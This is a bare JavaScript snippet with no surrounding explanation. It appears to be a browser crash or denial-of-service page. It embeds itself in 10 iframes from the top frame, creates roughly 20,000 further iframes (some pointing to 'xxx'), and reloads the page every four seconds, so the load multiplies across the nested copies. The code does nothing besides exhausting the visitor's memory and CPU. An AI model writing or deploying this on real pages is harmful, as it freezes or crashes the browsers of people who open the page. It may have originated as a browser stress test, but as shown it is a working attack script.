createIframes2();

for (let i = 0; i < 200; i++) {
  createIframes();
}

setTimeout(function () {
  location.reload();
}, 4000);

function createIframes() {
  let iframe = document.createElement('iframe');
  iframe.src = 'xxx';
  document.body.appendChild(iframe);

  for (var i = 0; i < 100; i++) {
    let iframe = document.createElement('iframe');
    document.body.appendChild(iframe);
  }
}

function createIframes2() {
  if (top != self) {
    return;
  }

  for (var i = 0; i < 10; i++) {
    let iframe = document.createElement('iframe');
    iframe.src = location.href;
    document.body.appendChild(iframe);
  }
}